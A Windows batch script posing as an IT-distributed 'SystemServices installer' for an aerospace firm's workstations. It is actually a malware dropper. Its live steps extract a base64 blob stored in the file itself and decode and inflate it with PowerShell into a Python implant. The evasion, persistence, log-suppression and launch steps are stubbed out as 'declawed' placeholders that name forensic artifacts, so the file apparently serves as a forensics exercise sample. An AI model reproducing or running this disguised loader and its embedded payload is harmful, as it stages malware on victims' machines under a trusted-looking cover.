@echo off
REM SystemServices installer - provisions the SystemServices background
REM agent and configures host monitoring exclusions. Distributed by
REM Skyloom Aerospace IT for engineering workstations.
setlocal enabledelayedexpansion

set "TARGET_DIR=%LOCALAPPDATA%\SystemServices"
set "PAYLOAD_FILE=%TARGET_DIR%\svc.py"
set "SELF=%~f0"
set "START_MARKER=::PAYLOAD-START::"
set "END_MARKER=::PAYLOAD-END::"

REM Step 1: locate payload boundaries via self-referential parsing
for /f "tokens=1 delims=:" %%a in ('findstr /n "%START_MARKER%" "%SELF%"') do set START_LINE=%%a
for /f "tokens=1 delims=:" %%a in ('findstr /n "%END_MARKER%" "%SELF%"') do set END_LINE=%%a
set /a PAYLOAD_LINES=%END_LINE% - %START_LINE% - 1

REM Step 2: extract payload bytes between sentinels
mkdir "%TARGET_DIR%" 2>/dev/null
powershell -NoProfile -Command ^
  "$src='%SELF%'; $dst='%TARGET_DIR%\svc.b64'; $start=%START_LINE%; $count=%PAYLOAD_LINES%; ^
   (Get-Content -LiteralPath $src -Encoding ASCII)[$start..($start+$count-1)] ^
   -join '' | Set-Content -LiteralPath $dst -Encoding ASCII -NoNewline"

REM Step 3: base64 + zlib decode into svc.py
powershell -NoProfile -Command ^
  "$b64=Get-Content -LiteralPath '%TARGET_DIR%\svc.b64' -Encoding ASCII; ^
   $bytes=[Convert]::FromBase64String($b64); ^
   $ms=New-Object IO.MemoryStream(,$bytes); ^
   $null=$ms.ReadByte(); $null=$ms.ReadByte(); ^
   $ds=New-Object IO.Compression.DeflateStream($ms,[IO.Compression.CompressionMode]::Decompress); ^
   $sr=New-Object IO.StreamReader($ds); ^
   $text=$sr.ReadToEnd(); $sr.Close(); ^
   Set-Content -LiteralPath '%PAYLOAD_FILE%' -Value $text -Encoding UTF8 -NoNewline"

REM Step 4: defense evasion (declawed for analysis)
:: DECLAWED-CMD #01 -- recover from PowerShell operational log
:: DECLAWED-CMD #02 -- recover from PowerShell operational log
:: DECLAWED-CMD #03 -- recover from PowerShell operational log
:: DECLAWED-CMD #04 -- recover from PowerShell operational log
:: DECLAWED-CMD #05 -- recover from PowerShell operational log
:: DECLAWED-CMD #06 -- recover from PowerShell operational log

REM Step 5: persistence - Run key
:: DECLAWED-CMD #07 -- recover from NTUSER.DAT registry export

REM Step 6: persistence - Startup folder VBS launcher
:: DECLAWED-CMD #08 -- recover from Sysmon file-creation events in Startup folder
:: DECLAWED-CMD #09 -- recover from Sysmon file-creation events in Startup folder

REM Step 7: persistence - scheduled task
:: DECLAWED-CMD #10 -- recover from scheduled-tasks.xml export

REM Step 8: persistence - WMI EventConsumer subscription
:: DECLAWED-CMD #11 -- recover from WMI repository export
:: DECLAWED-CMD #12 -- recover from WMI repository export
:: DECLAWED-CMD #13 -- recover from WMI repository export

REM Step 9: suppress firewall + PowerShell logging
:: DECLAWED-CMD #14 -- recover from audit policy registry hives
:: DECLAWED-CMD #15 -- recover from audit policy registry hives
:: DECLAWED-CMD #16 -- recover from audit policy registry hives

REM Step 10: launch implant + self-clean
:: DECLAWED-CMD #17 -- recover from Sysmon process-creation events for the implant launch
:: DECLAWED-CMD #18 -- recover from Sysmon process-creation events for the implant launch
:: DECLAWED-CMD #19 -- recover from Sysmon process-creation events for the implant launch

endlocal
exit /b 0

::PAYLOAD-START::
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
::PAYLOAD-END::
